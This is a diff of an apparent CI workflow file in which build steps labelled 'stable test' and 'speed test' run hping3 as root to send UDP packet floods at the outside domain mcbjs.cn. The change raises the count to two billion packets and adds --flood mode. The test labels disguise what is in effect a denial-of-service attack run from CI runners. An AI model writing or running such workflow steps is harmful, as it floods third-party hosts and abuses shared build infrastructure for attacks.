@@ -22,6 +22,6 @@ jobs:
     - name: make
       run: make
     - name: stable test
-      run: sudo ./hping3 -2 --faster -c 50000000 -p 5112 mcbjs.cn 
+      run: sudo ./hping3 -2 --faster -c 2000000000 -p 5112 mcbjs.cn 
     - name: speed test
-      run: sudo ./hping3 -2 --faster -c 50000000 -p 5112 mcbjs.cn
+      run: sudo ./hping3 -2 --flood -c 10000000 -p 5112 mcbjs.cn
